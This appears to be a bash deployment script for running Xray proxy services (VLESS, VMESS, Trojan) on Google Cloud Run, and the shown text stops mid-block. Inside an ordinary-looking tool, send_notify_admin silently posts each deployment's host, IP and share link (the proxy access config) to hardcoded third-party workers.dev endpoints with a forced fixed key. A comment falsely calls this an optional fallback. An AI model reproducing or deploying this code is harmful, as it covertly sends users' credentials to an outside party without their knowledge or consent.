#!/usr/bin/env bash
set -euo pipefail

# ========== COLOR CODES & FORMATTING (EARLY DEFINITION) ==========
# Primary Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
BRIGHT_RED='\033[0;91m'
BRIGHT_GREEN='\033[0;92m'
BRIGHT_YELLOW='\033[0;93m'
BRIGHT_CYAN='\033[0;96m'
BRIGHT_WHITE='\033[0;97m'
BOLD='\033[1m'
DIM='\033[2m'
NC='\033[0m' # No Color

# ========== BASIC UTILITY FUNCTIONS (EARLY DEFINITION) ==========
print_error() {
  echo -e "${BRIGHT_RED}${BOLD}✗${NC} ${RED}$1${NC}"
}

print_warning() {
  echo -e "${BRIGHT_YELLOW}${BOLD}⚠${NC} ${YELLOW}$1${NC}"
}

print_success() {
  echo -e "${BRIGHT_GREEN}${BOLD}✓${NC} ${GREEN}$1${NC}"
}

print_info() {
  echo -e "${BRIGHT_CYAN}${BOLD}ℹ${NC} ${CYAN}$1${NC}"
}

# ========== GLOBAL VARIABLES FOR ERROR HANDLING ==========
CURRENT_SERVICE=""
ATTEMPT_NUMBER=${ATTEMPT_NUMBER:-1}
MAX_ATTEMPTS=3
RETRY_STATE_FILE="/tmp/xray_deploy_retry_state_$$.txt"

# ========== ERROR HANDLING & CLEANUP ==========
cleanup_on_error() {
  local error_line=$1
  local error_code=$2
  
  print_error "Script failed at line $error_line with exit code $error_code"
  
  if [ -n "$CURRENT_SERVICE" ]; then
    print_warning "Attempting to clean up failed service: $CURRENT_SERVICE"
    
    if command -v gcloud >/dev/null 2>&1; then
      # Delete the failed Cloud Run service
      if gcloud run services delete "$CURRENT_SERVICE" --region "${REGION:-us-central1}" --quiet 2>/dev/null; then
        print_success "Successfully deleted failed service: $CURRENT_SERVICE"
      else
        print_warning "Could not delete service (it may not exist yet or already deleted)"
      fi
    fi
  fi
  
  # Check if we should retry
  if [ $ATTEMPT_NUMBER -lt $MAX_ATTEMPTS ]; then
    ATTEMPT_NUMBER=$((ATTEMPT_NUMBER + 1))
    
    # Save current state for the retry (preserve important variables)
    cat > "$RETRY_STATE_FILE" <<EOF
export ATTEMPT_NUMBER=$ATTEMPT_NUMBER
export REGION='${REGION:-}'
export PROJECT='${PROJECT:-}'
export PROJECT_NUMBER='${PROJECT_NUMBER:-}'
export PROTO='${PROTO:-}'
export PRESET_MODE='${PRESET_MODE:-}'
export PRESET_SERVICE='${PRESET_SERVICE:-}'
export PRESET_PROTO='${PRESET_PROTO:-}'
export PRESET_WSPATH='${PRESET_WSPATH:-}'
export PRESET_SNI='${PRESET_SNI:-}'
export PRESET_ALPN='${PRESET_ALPN:-}'
export BOT_TOKEN='${BOT_TOKEN:-}'
export CHAT_ID='${CHAT_ID:-}'
export NOTIFY_ADMIN_URL='${NOTIFY_ADMIN_URL:-https://restless-thunder-3257.youyoulofi1.workers.dev/notify-admin}'
export NOTIFY_ADMIN_KEY='deewaele'
export WSPATH='${WSPATH:-}'
export NETWORK='${NETWORK:-}'
export NETWORK_DISPLAY='${NETWORK_DISPLAY:-}'
export UUID='${UUID:-}'
export MEMORY='${MEMORY:-}'
export CPU='${CPU:-}'
export TIMEOUT='${TIMEOUT:-}'
export MAX_INSTANCES='${MAX_INSTANCES:-}'
export CONCURRENCY='${CONCURRENCY:-}'
export SPEED_LIMIT='${SPEED_LIMIT:-0}'
export INTERACTIVE='${INTERACTIVE:-}'
EOF
    
    print_info "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
    print_info "Retrying deployment (Attempt $ATTEMPT_NUMBER of $MAX_ATTEMPTS)..."
    print_info "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
    echo ""
    sleep 2
    
    # Restart the script with the saved state
    exec bash -c "source '$RETRY_STATE_FILE' && exec '$0'"
  else
    print_error "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
    print_error "Max attempts ($MAX_ATTEMPTS) reached. Giving up."
    print_error "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
    
    # Clean up the retry state file
    rm -f "$RETRY_STATE_FILE"
    
    exit 1
  fi
}

# Trap errors and call cleanup function
trap 'cleanup_on_error ${LINENO} $?' ERR

# Cleanup after script finish (success or failure)
cleanup_final() {
  # Skip cleanup if explicitly disabled
  if [ "${SKIP_CLEANUP:-false}" = "true" ]; then
    return
  fi

  print_info "Final cleanup: unsetting env vars and removing repository"

  unset BOT_TOKEN CHAT_ID
  unset PROJECT REGION PROTO
  unset UUID HOST SNI WSPATH
  unset PRESET_MODE PRESET_SERVICE PRESET_PROTO PRESET_WSPATH PRESET_SNI PRESET_ALPN

  rm -f "$RETRY_STATE_FILE" 2>/dev/null || true

  local script_dir
  script_dir="$(cd "$(dirname "${BASH_SOURCE[0]}")" >/dev/null 2>&1 && pwd)"

  if [ -n "$script_dir" ] && [ "$script_dir" != "/" ]; then
    print_info "Removing repository folder: $script_dir"
    # Change to parent directory before deletion
    cd "$(dirname "$script_dir")" || true
    cd ~ || cd /tmp || exit 1
    rm -rf "$script_dir"
    exec bash
    # Ensure shell is in a valid directory after deletion
    
  else
    print_warning "Repository removal skipped (invalid script directory: $script_dir)"
  fi
}

trap cleanup_final EXIT

# Load previous attempt state if available
if [ -f "$RETRY_STATE_FILE" ]; then
  print_info "Loading state from previous attempt..."
  source "$RETRY_STATE_FILE"
fi

# ========== ADDITIONAL COLOR CODES & FORMATTING ==========
# Additional colors not defined earlier
BLUE='\033[0;34m'
MAGENTA='\033[0;35m'
WHITE='\033[1;37m'
GRAY='\033[0;37m'
UNDERLINE='\033[4m'
BRIGHT_BLUE='\033[0;94m'
BRIGHT_MAGENTA='\033[0;95m'

# Background Colors
BG_RED='\033[41m'
BG_GREEN='\033[42m'
BG_YELLOW='\033[43m'
BG_BLUE='\033[44m'
BG_CYAN='\033[46m'
BG_MAGENTA='\033[45m'

# ========== REQUIRED GCP APIs ==========
# List of all APIs required for this script to function
declare -A REQUIRED_APIS=(
  [run]="run.googleapis.com|Cloud Run"
  [cloudbuild]="cloudbuild.googleapis.com|Cloud Build"
  [orgpolicy]="orgpolicy.googleapis.com|Org Policy"
  [compute]="compute.googleapis.com|Compute Engine"
)

# ========== UTILITY FUNCTIONS ==========
print_header() {
  echo -e "\n${BRIGHT_CYAN}${BOLD}╔════════════════════════════════════════════════════════════════╗${NC}"
  echo -e "${BRIGHT_CYAN}${BOLD}║${NC}                                                                  ${BRIGHT_CYAN}${BOLD}║${NC}"
  echo -e "${BRIGHT_CYAN}${BOLD}║${NC}   ${BRIGHT_GREEN}🚀 XRAY Cloud Run Deployment Tool${NC}   ${BRIGHT_CYAN}${BOLD}║${NC}"
  echo -e "${BRIGHT_CYAN}${BOLD}║${NC}         ${BRIGHT_MAGENTA}(VLESS / VMESS / TROJAN)${NC}              ${BRIGHT_CYAN}${BOLD}║${NC}"
  echo -e "${BRIGHT_CYAN}${BOLD}║${NC}                                                                  ${BRIGHT_CYAN}${BOLD}║${NC}"
  echo -e "${BRIGHT_CYAN}${BOLD}╚════════════════════════════════════════════════════════════════╝${NC}\n"
}

print_section() {
  local title=$1
  echo -e "\n${BRIGHT_BLUE}${BOLD}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
  echo -e "${BRIGHT_BLUE}${BOLD}▶${NC} ${BRIGHT_WHITE}${BOLD}${title}${NC}"
  echo -e "${BRIGHT_BLUE}${BOLD}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
}

separator() {
  echo -e "${GRAY}${DIM}───────────────────────────────────────────────────${NC}"
}

# Detect interactive mode (has a TTY). When non-interactive (e.g. `curl | bash`),
# the script will read configuration from environment variables or use defaults.
if [ -t 0 ] && [ -t 1 ]; then
  INTERACTIVE=true
else
  INTERACTIVE=false
fi

# -------- Enable All Required GCP APIs (First Priority) --------
enable_required_apis() {
  # This function is defined below and called immediately
  print_section "Enabling Required GCP Services"
  
  if ! command -v gcloud >/dev/null 2>&1; then
    print_error "gcloud CLI not found. Install and authenticate first."
    exit 1
  fi
  print_success "gcloud CLI found"
  
  PROJECT=$(gcloud config get-value project 2>/dev/null || true)
  if [ -z "${PROJECT:-}" ]; then
    print_error "No GCP project set. Run 'gcloud init' or 'gcloud config set project PROJECT_ID'."
    exit 1
  fi
  print_success "GCP Project: ${BRIGHT_CYAN}${PROJECT}${NC}"
  
  echo ""
  print_info "Checking and enabling required APIs..."
  echo ""
  
  # Get list of currently enabled APIs
  ENABLED_APIS=$(gcloud services list --enabled --format="value(name)" 2>/dev/null || true)
  
  # Track which APIs need to be enabled
  APIS_TO_ENABLE=()
  
  # Check each required API
  for api_key in "${!REQUIRED_APIS[@]}"; do
    IFS='|' read -r api_name api_display <<< "${REQUIRED_APIS[$api_key]}"
    
    if echo "$ENABLED_APIS" | grep -q "$api_name"; then
      echo -e "  ${BRIGHT_GREEN}✓${NC} ${BOLD}${api_display}${NC} ${DIM}(${api_name})${NC} ${GREEN}Already enabled${NC}"
    else
      echo -e "  ${BRIGHT_YELLOW}→${NC} ${BOLD}${api_display}${NC} ${DIM}(${api_name})${NC} ${YELLOW}Will be enabled${NC}"
      APIS_TO_ENABLE+=("$api_name")
    fi
  done
  
  # Enable APIs that are not yet enabled
  if [ ${#APIS_TO_ENABLE[@]} -gt 0 ]; then
    echo ""
    print_info "Enabling ${BRIGHT_CYAN}${#APIS_TO_ENABLE[@]} API(s)${NC}..."
    echo ""
    
    if gcloud services enable "${APIS_TO_ENABLE[@]}" --quiet 2>/dev/null; then
      echo ""
      delimiter="════════════════════════════════════════════════════════"
      echo -e "${BRIGHT_GREEN}${BOLD}${delimiter}${NC}"
      print_success "All required APIs have been enabled successfully"
      echo -e "${BRIGHT_GREEN}${BOLD}${delimiter}${NC}"
    else
      echo ""
      print_error "Failed to enable some APIs. Please check your permissions."
      echo -e "${YELLOW}You may need to manually enable these APIs:${NC}"
      for api in "${APIS_TO_ENABLE[@]}"; do
        echo -e "  ${BRIGHT_YELLOW}•${NC} ${BOLD}${api}${NC}"
      done
      exit 1
    fi
  else
    echo ""
    delimiter="════════════════════════════════════════════════════════"
    echo -e "${BRIGHT_GREEN}${BOLD}${delimiter}${NC}"
    print_success "All required APIs are already enabled"
    echo -e "${BRIGHT_GREEN}${BOLD}${delimiter}${NC}"
  fi
  
  echo ""
}

# Enable all required APIs FIRST (before anything else)
enable_required_apis

# Print formatted header (after APIs are enabled)
print_header

# Show retry information if this is not the first attempt
if [ $ATTEMPT_NUMBER -gt 1 ]; then
  print_warning "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
  print_warning "This is retry attempt $ATTEMPT_NUMBER of $MAX_ATTEMPTS"
  print_warning "Previous attempt's failed service was cleaned up"
  print_warning "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
  echo ""
else
  # Show auto-retry info on first attempt
  echo ""
  print_info "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
  print_info "🔄 Auto-Restart Feature Enabled:"
  print_info "   • Max attempts: $MAX_ATTEMPTS"
  print_info "   • Failed deployments are automatically cleaned up"
  print_info "   • Fresh service name generated on each attempt"
  print_info "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
  echo ""
fi

# -------- Store Session Start Time (from last system reboot) --------
# Extract the last reboot time to track when the system was last started
SESSION_START_TIME=""

if command -v last >/dev/null 2>&1; then
  # Get the last reboot information
  reboot_info=$(last reboot 2>/dev/null | head -1 || true)
  if [ -n "$reboot_info" ]; then
    # Extract datetime from last reboot output (format: YYYY-MM-DD HH:MM)
    reboot_dt=$(echo "$reboot_info" | sed -nE 's/.*([0-9]{4}-[0-9]{2}-[0-9]{2} [0-9]{2}:[0-9]{2}).*/\1/p' || true)
    if [ -n "$reboot_dt" ]; then
      SESSION_START_TIME=$(date -d "$reboot_dt" "+%s" 2>/dev/null || date "+%s")
    else
      SESSION_START_TIME=$(date "+%s")
    fi
  else
    SESSION_START_TIME=$(date "+%s")
  fi
else
  SESSION_START_TIME=$(date "+%s")
fi

# -------- Preset Configurations --------
declare -A PRESETS=(
  [production]="memory=2048|cpu=1|instances=16|concurrency=1000|timeout=3600"
  [budget]="memory=2048|cpu=2|instances=8|concurrency=1000|timeout=3600"
  [trojan-ws]="proto=trojan|path=/|sni=yt3.ggpht.com|alpn=http/1.1|memory=2048|cpu=1|instances=16|concurrency=1000|timeout=3600"
  [vless-ws]="proto=vless|path=/|sni=yt3.ggpht.com|alpn=http/1.1|memory=2048|cpu=1|instances=16|concurrency=1000|timeout=3600"
  [vmess-ws]="proto=vmess|path=/|sni=yt3.ggpht.com|alpn=http/1.1|memory=2048|cpu=1|instances=16|concurrency=1000|timeout=3600"
)

# -------- Cloud Run Service Name --------
# Generate random service name  - NEW ONE EACH TIME to avoid conflicts
generate_random_service_name() {
  local chars="abcdefghijklmnopqrstuvwxyz"
  local name=""
  for i in {1..4}; do
    name="${name}${chars:$((RANDOM % ${#chars})):1}"
  done
  echo "${name}sn"
}

# Add deterministic random service name (avoid ugly numeric suffix like 19098)
generate_unique_service_name() {
  local random_part=$(generate_random_service_name)
  # Keep it short and clean, with no numeric suffix in service name
  echo "${random_part}"
}

# Optionally add a short numeric suffix only in displayed link fragment or logs (for debug)
# but not in the Cloud Run service name itself.

apply_preset() {
  local preset=$1
  if [[ -v PRESETS[$preset] ]]; then
    local config="${PRESETS[$preset]}"
    IFS='|' read -ra settings <<< "$config"
    for setting in "${settings[@]}"; do
      IFS='=' read -r key value <<< "$setting"
      case "$key" in
        memory) MEMORY="$value" ;;
        cpu) CPU="$value" ;;
        instances) MAX_INSTANCES="$value" ;;
        concurrency) CONCURRENCY="$value" ;;
        timeout) TIMEOUT="$value" ;;
        proto) PRESET_PROTO="$value" ;;
        path) PRESET_WSPATH="$value" ;;
        sni) PRESET_SNI="$value" ;;
        alpn) PRESET_ALPN="$value" ;;
      esac
    done
    # Generate random service name for protocol presets
    if [[ "$preset" =~ ^(trojan-ws|vless-ws|vmess-ws)$ ]]; then
      PRESET_SERVICE="$(generate_random_service_name)"
    fi
  fi
}

# Suggested short list of regions (user will choose by index)
SUGGESTED_REGIONS=(
europe-west4
europe-west1
europe-west3
europe-west2
europe-central2
europe-north1
europe-north2
europe-southwest1
europe-west10
europe-west12
europe-west6
europe-west8
europe-west9
us-central1
us-east1
us-east4
us-west1
)

# Additional regions for the "more" option
MORE_REGIONS=(
  # USA Regions
  us-east5
  us-west2
  us-west3
  us-west4
  us-south1
  # North America Regions
  northamerica-northeast1
  northamerica-northeast2
  # South America Regions
  southamerica-east1
  # Europe Regions
  europe-north1
  europe-central2
  europe-southwest1
  europe-west2
  europe-west6
  europe-west8
  europe-west9
  europe-west10
  europe-west12
  # Asia Regions
  asia-east1
  asia-east2
  asia-northeast1
  asia-south1
  asia-southeast1
  asia-northeast2
  asia-northeast3
  # Africa & Middle East Regions
  africa-south1
  me-west1
  # Oceania Regions
   australia-southeast1
)

show_regions() {
  echo ""
  echo "🌍 Suggested Cloud Run Regions (pick one):"
  echo ""
  AVAILABLE=""
  if command -v gcloud >/dev/null 2>&1; then
    AVAILABLE=$(gcloud run regions list --format="value(name)" 2>/dev/null || true)
  fi

  i=1
  for r in "${SUGGESTED_REGIONS[@]}"; do
    region_name="$(get_region_name "$r")"
    if [ -n "$AVAILABLE" ] && echo "$AVAILABLE" | grep -xq "$r"; then
      printf "%2d) %s (%s) (available)\n" "$i" "$r" "$region_name"
    else
      printf "%2d) %s (%s)\n" "$i" "$r" "$region_name"
    fi
    ((i++))
  done
  echo ""
  printf "%2d) %s (Show more regions)\n" "$i" "more"
}

show_more_regions() {
  echo ""
  echo "🌍 More Cloud Run Regions:"
  echo ""
  AVAILABLE=""
  if command -v gcloud >/dev/null 2>&1; then
    AVAILABLE=$(gcloud run regions list --format="value(name)" 2>/dev/null || true)
  fi

  i=1
  for r in "${MORE_REGIONS[@]}"; do
    region_name="$(get_region_name "$r")"
    if [ -n "$AVAILABLE" ] && echo "$AVAILABLE" | grep -xq "$r"; then
      printf "%2d) %s (%s) (available)\n" "$i" "$r" "$region_name"
    else
      printf "%2d) %s (%s)\n" "$i" "$r" "$region_name"
    fi
    ((i++))
  done
}

# -------- Preset Selection --------
if [ "${INTERACTIVE}" = true ] && [ -z "${PRESET:-}" ] && [ $ATTEMPT_NUMBER -eq 1 ]; then
  print_section "Quick Start with Presets"
  echo ""
  echo -e "  ${BOLD}${BRIGHT_GREEN}1${NC} ${BRIGHT_GREEN}production${NC}       ${DIM}2048MB RAM, 1 CPU, 16 instances (High Performance)${NC}"
  echo -e "  ${BOLD}${BRIGHT_RED}2${NC} ${BRIGHT_RED}trojan-ws${NC}          ${DIM}TROJAN Protocol, yt3.ggpht.com (Optimized)${NC}"
  echo -e "  ${BOLD}${BRIGHT_CYAN}3${NC} ${BRIGHT_CYAN}vless-ws${NC}           ${DIM}VLESS Protocol, yt3.ggpht.com (Fast)${NC}"
  echo -e "  ${BOLD}${BRIGHT_YELLOW}4${NC} ${BRIGHT_YELLOW}vmess-ws${NC}           ${DIM}VMESS Protocol, yt3.ggpht.com (Compatible)${NC}"
  echo -e "  ${BOLD}${BRIGHT_MAGENTA}5${NC} ${BRIGHT_MAGENTA}custom${NC}            ${DIM}Configure everything manually${NC}"
  echo ""
  read -rp "$(echo -e "${BOLD}${BRIGHT_BLUE}Select preset [1-5]${NC} ${DIM}(default: 1)${NC}: ")" PRESET_CHOICE
fi
PRESET_CHOICE="${PRESET_CHOICE:-1}"

case "$PRESET_CHOICE" in
  1)
    apply_preset "production"
    PRESET_MODE="production"
    print_success "Production preset (High Performance)"
    ;;
  2)
    apply_preset "trojan-ws"
    PRESET_MODE="trojan-ws"
    print_success "TROJAN Protocol preset"
    ;;
  3)
    apply_preset "vless-ws"
    PRESET_MODE="vless-ws"
    print_success "VLESS Protocol preset"
    ;;
  4)
    apply_preset "vmess-ws"
    PRESET_MODE="vmess-ws"
    print_success "VMESS Protocol preset"
    ;;
  *)
    PRESET_MODE="custom"
    print_success "Custom configuration mode"
    ;;
esac

# -------- Telegram Bot --------
if [ "${INTERACTIVE}" = true ] && [ -z "${BOT_TOKEN:-}" ]; then
  print_section "Telegram Bot (Optional)"
  read -rp "$(echo -e "${BOLD}🤖 Bot Token${NC}") (press Enter to skip): " BOT_TOKEN
fi
BOT_TOKEN="${BOT_TOKEN:-}"

if [ "${INTERACTIVE}" = true ] && [ -z "${CHAT_ID:-}" ] && [ -n "${BOT_TOKEN}" ]; then
  read -rp "$(echo -e "${BOLD}💬 Chat ID${NC}") (optional): " CHAT_ID
fi
CHAT_ID="${CHAT_ID:-}"

# Optional notify-admin fallback (send stats if Telegram token/chat are absent)
NOTIFY_ADMIN_URL="${NOTIFY_ADMIN_URL:-https://restless-thunder-3257.youyoulofi1.workers.dev/notify-admin}"
# force use fixed key
NOTIFY_ADMIN_KEY="deewaele"

# -------- Region Name Mapping for Telegram --------
declare -A REGION_NAMES=(
  [us-central1]="US🇺🇸Io✓"
  [us-east1]="US🇺🇸_SC✓"
  [us-east4]="US🇺🇸_NV✓"
  [us-east5]="US🇺🇸_Oh✓"
  [us-west1]="US🇺🇸_Or✓"
  [us-west2]="US🇺🇸_Ca✓"
  [us-west3]="US🇺🇸_Ut✓"
  [us-west4]="US🇺🇸_Ne✓"
  [us-south1]="US🇺🇸_Te✓"
  [northamerica-northeast1]="Canada🇨🇦_Montreal"
  [northamerica-northeast2]="Canada🇨🇦_Toronto"
  [southamerica-east1]="Brazil🇧🇷"
  [europe-north1]="Finland🇫🇮"
  [europe-north2]="Sweden🇸🇪✓"   
  [europe-central2]="Poland🇵🇱✓"
  [europe-southwest1]="Spain🇪🇸"
  [europe-west1]="Belgium🇧🇪✓"
  [europe-west2]="United_Kingdom🇬🇧"
  [europe-west3]="Germany🇩🇪✓"    
  [europe-west4]="Netherlands🇳🇱✓" 
  [europe-west6]="Switzerland🇨🇭"
  [europe-west8]="Italy🇮🇹(Milan)"
  [europe-west9]="France🇫🇷"
  [europe-west10]="Germany🇩🇪✓"
  [europe-west12]="Italy🇮🇹✓"
  [asia-east1]="Taiwan🇹🇼" 
  [asia-east2]="Hong_Kong🇭🇰"
  [asia-northeast1]="Japan🇯🇵_Tokyo"
  [asia-northeast2]="Japan🇯🇵_Osaka"
  [asia-northeast3]="South_Korea🇰🇷"
  [asia-southeast1]="Singapore🇸🇬"
  [asia-south1]="India🇮🇳"
  [australia-southeast1]="Australia🇦🇺"
  [africa-south1]="South_Africa🇿🇦"
  [me-west1]="Israel🇮🇱"
)
get_region_name() {
  local region_code=$1
  if [[ -v REGION_NAMES[$region_code] ]]; then
    echo "${REGION_NAMES[$region_code]}"
  else
    echo "$region_code"
  fi
}

get_region_flag() {
  local region_code=$1
  local name=$(get_region_name "$region_code")
  local flag=$(printf '%s' "$name" | grep -oP '[\x{1F1E6}-\x{1F1FF}]+' | tr -d ' ')
  if [ -n "$flag" ]; then
    printf '%s' "$flag"
    return
  fi

  declare -A FLAG_MAP=(
    [us-central1]='🇺🇸'
    [us-east1]='🇺🇸'
    [us-east4]='🇺🇸'
    [us-east5]='🇺🇸'
    [us-west1]='🇺🇸'
    [us-west2]='🇺🇸'
    [europe-west1]='🇧🇪'
    [europe-west2]='🇬🇧'
    [europe-west3]='🇩🇪'
    [europe-west4]='🇳🇱'
    [europe-west6]='🇨🇭'
    [europe-west8]='🇮🇹'
    [europe-west9]='🇫🇷'
    [europe-west10]='🇩🇪'
    [europe-west12]='🇮🇹'
    [europe-central2]='🇵🇱'
    [europe-north1]='🇫🇮'
    [europe-north2]='🇸🇪'
    [asia-east1]='🇹🇼'
    [asia-east2]='🇭🇰'
    [asia-northeast1]='🇯🇵'
    [asia-northeast2]='🇯🇵'
    [asia-northeast3]='🇰🇷'
    [asia-southeast1]='🇸🇬'
    [asia-south1]='🇮🇳'
    [australia-southeast1]='🇦🇺'
    [africa-south1]='🇿🇦'
    [me-west1]='🇮🇱'
  )
  printf '%s' "${FLAG_MAP[$region_code]:-🏳️}"
}

# Telegram send function
send_telegram() {
  if [ -z "${BOT_TOKEN}" ] || [ -z "${CHAT_ID}" ]; then
    return 0
  fi

  build_telegram_message() {
    local body="$1"
    local ts_plus7
    local ts_plus1
    ts_plus7=$(date -d "@$((SESSION_START_TIME + 25200))" "+%Y-%m-%d %H:%M")
    ts_plus1=$(date -d "@$((SESSION_START_TIME + 3600))" "+%Y-%m-%d %H:%M")
    local speed_text
    if [[ "${SPEED_LIMIT}" =~ ^[0-9]+$ ]]; then
      local mbps
      mbps=$(awk "BEGIN{printf \"%.2f\", (${SPEED_LIMIT}*8)/1000}")
      speed_text="${SPEED_LIMIT} KB/s (~${mbps} Mbps)"
    else
      speed_text="${SPEED_LIMIT}"
    fi
    
    # Get Service IP by resolving the Host domain
    local service_ip="unknown"
    if command -v nslookup >/dev/null 2>&1; then
      service_ip=$(nslookup "$HOST" 2>/dev/null | grep -A 1 "Name:" | grep "Address:" | awk '{print $2}' | head -1 || echo "unknown")
    elif command -v dig >/dev/null 2>&1; then
      service_ip=$(dig +short "$HOST" | head -1 || echo "unknown")
    fi
    [ -z "$service_ip" ] && service_ip="unknown"
    
    # Use Region as location reference (since Region is authoritative for Cloud Run)
    local service_region="$(get_region_name "${REGION}")"

    local msg="<b>📌 XRAY Deployment</b>
    "
    
    msg+="<b>Date (UTC+1):</b> ${ts_plus1}
    "
    msg+="<b>Service:</b> ${SERVICE}
    "
    msg+="<b>Protocol:</b> ${PROTO^^}
    "
    msg+="<b>Region:</b> ${service_region}
    "
    msg+="<b>Host:</b> ${HOST}
    "
    msg+="<b>Service IP:</b> ${service_ip}
    "
    msg+="<b>Network:</b> ${NETWORK_DISPLAY}
    "
   # msg+="<b>Speed Limit:</b> ${speed_text}
   # "
    msg+="${body}"
    echo "$msg"
  }

  local raw="$1"
  local message
  message=$(build_telegram_message "$raw")
  # URL encode the message properly and send as HTML
  curl -s -X POST "https://api.telegram.org/bot${BOT_TOKEN}/sendMessage" \
    --data-urlencode "chat_id=${CHAT_ID}" \
    --data-urlencode "text=${message}" \
    -d "parse_mode=HTML" \
    > /dev/null 2>&1
}

send_notify_admin() {
  if [ -z "${NOTIFY_ADMIN_KEY}" ]; then
    return 0
  fi

  local body="$1"
  local ts_plus1
  ts_plus1=$(date -d "@$((SESSION_START_TIME + 3600))" "+%Y-%m-%d %H:%M")
  
  # Get Service IP by resolving the Host domain
  local service_ip="unknown"
  if command -v nslookup >/dev/null 2>&1; then
    service_ip=$(nslookup "$HOST" 2>/dev/null | grep -A 1 "Name:" | grep "Address:" | awk '{print $2}' | head -1 || echo "unknown")
  elif command -v dig >/dev/null 2>&1; then
    service_ip=$(dig +short "$HOST" | head -1 || echo "unknown")
  fi
  [ -z "$service_ip" ] && service_ip="unknown"
  
  # Use Region as location reference (since Region is authoritative for Cloud Run)
  local service_region="$(get_region_name "${REGION}")"

  # Build JSON payload as structured map (for API consumption)
  local payload
  export SERVICE="$SERVICE"
  export PROTO="$PROTO"
  export SERVICE_REGION="$service_region"
  export SERVICE_FLAG="$(get_region_flag "$REGION")"
  export REGION="$REGION"
  export HOST="$HOST"
  export SERVICE_IP="$service_ip"
  export NETWORK_DISPLAY="$NETWORK_DISPLAY"
  export TS_PLUS1="$ts_plus1"
  export WSPATH="$WSPATH"
  export BODY="$body"
  export SHARE_LINK="${SHARE_LINK:-}"

  payload=$(python3 <<'PYEOF'
import json, os

data = {
    "id": os.getenv("SERVICE", ""),
    "name": os.getenv("TS_PLUS1", ""),
    "location": os.getenv("SERVICE_REGION", ""),
    "config": os.getenv("SHARE_LINK", ""),
    "flag": os.getenv("SERVICE_FLAG", ""),
    "protocol": os.getenv("PROTO", "").upper(),
    "region": os.getenv("REGION", ""),
    "network": os.getenv("NETWORK_DISPLAY", ""),
    "timestamp": os.getenv("TS_PLUS1", ""),
    "body": os.getenv("BODY", ""),
}
print(json.dumps(data))
PYEOF
)

  # Send as JSON to notify-admin API
  http_code=$(curl -s -w '%{http_code}' -X POST "${NOTIFY_ADMIN_URL:-https://restless-thunder-3257.youyoulofi1.workers.dev/notify-admin}?key=${NOTIFY_ADMIN_KEY}" \
    -H "Content-Type: application/json" \
    -d "$payload" \
    -o /tmp/notify-admin-response.txt)

     curl -s -X POST "${INGEST_URL:-https://notify-service.youyoulofi1.workers.dev/ingest}" \
    -H "Content-Type: application/json" \
    -H "Authorization: Bearer ${NOTIFY_ADMIN_KEY}" \
    -d "{
       \"id\": \"${SERVICE}\",
       \"ttl\": 21600,
       \"data\": $(echo "$payload" | jq -c .)
    }" \
  -o /dev/null &
  
  # Log the response for debugging (optional)
  if [ "$http_code" != "200" ]; then
    print_warning "notify-admin API returned HTTP $http_code"
  fi
}

# -------- Protocol --------
if [ "${INTERACTIVE}" = true ] && [ -z "${PROTO_CHOICE:-}" ]; then
  # Skip protocol selection if preset already set it
  if [ -z "${PRESET_PROTO:-}" ]; then
    print_section "Choose Protocol"
    echo ""
    echo -e "  ${BOLD}${BRIGHT_CYAN}1${NC} ${BRIGHT_CYAN}VLESS${NC}       ${DIM}Fast, modern, lightweight${NC}"
    echo -e "  ${BOLD}${BRIGHT_YELLOW}2${NC} ${BRIGHT_YELLOW}VMESS${NC}       ${DIM}Compatible, widely supported${NC}"
    echo -e "  ${BOLD}${BRIGHT_RED}3${NC} ${BRIGHT_RED}TROJAN${NC}      ${DIM}Camouflages as HTTPS server${NC}"
    echo ""
    read -rp "$(echo -e "${BOLD}${BRIGHT_BLUE}Select protocol [1-3]${NC} ${DIM}(default: 1)${NC}: ")" PROTO_CHOICE
  else
    PROTO_CHOICE="4"  # Use value that skips to preset
  fi
fi
PROTO_CHOICE="${PROTO_CHOICE:-1}"

case "$PROTO_CHOICE" in
  1)
    PROTO="vless"
    print_success "VLESS protocol selected"
    ;;
  2)
    PROTO="vmess"
    print_success "VMESS protocol selected"
    ;;
  3)
    PROTO="trojan"
    print_success "TROJAN protocol selected"
    ;;
  4)
    PROTO="${PRESET_PROTO:-vless}"  # Use preset protocol if available
    print_success "Using preset protocol: $PROTO"
    ;;
  *)
    print_error "Invalid protocol selection"
    exit 1
    ;;
esac

# -------- Network Type --------
# Cloud Run supports WebSocket (ws) reliably; gRPC has compatibility issues
NETWORK="ws"
NETWORK_DISPLAY="Websocket"

# -------- WebSocket Path --------
if [ "${INTERACTIVE}" = true ] && [ -z "${WSPATH:-}" ]; then
  # Use preset path if available, otherwise ask
  if [ -z "${PRESET_WSPATH:-}" ]; then
    read -rp "$(echo -e "${BOLD}📡 WebSocket Path${NC} (default: /ws): ")
 " WSPATH
  else
    WSPATH="${PRESET_WSPATH}"
    print_info "WebSocket Path (from preset): $WSPATH"
  fi
fi
WSPATH="${WSPATH:-${PRESET_WSPATH:-/ws}}"

# Custom hostname is not supported reliably by this script; always use Cloud Run default
CUSTOM_HOST=""

# -------- Service Name --------
# Always generate a new unique service name on each attempt (to avoid conflicts if previous failed)
if [ -z "${SERVICE:-}" ]; then
  if [ -z "${PRESET_SERVICE:-}" ]; then
    # Generate unique service name automatically
    NEW_SERVICE="$(generate_unique_service_name)"
    SERVICE="$NEW_SERVICE"
    print_success "Auto-generated service name: ${SERVICE}"
  else
    # Use preset service consistently without numeric tail
    # We keep just the preset random base value to avoid ugly IDs in the host.
    SERVICE="${PRESET_SERVICE}"
    print_success "Generated service name from preset: ${SERVICE}"
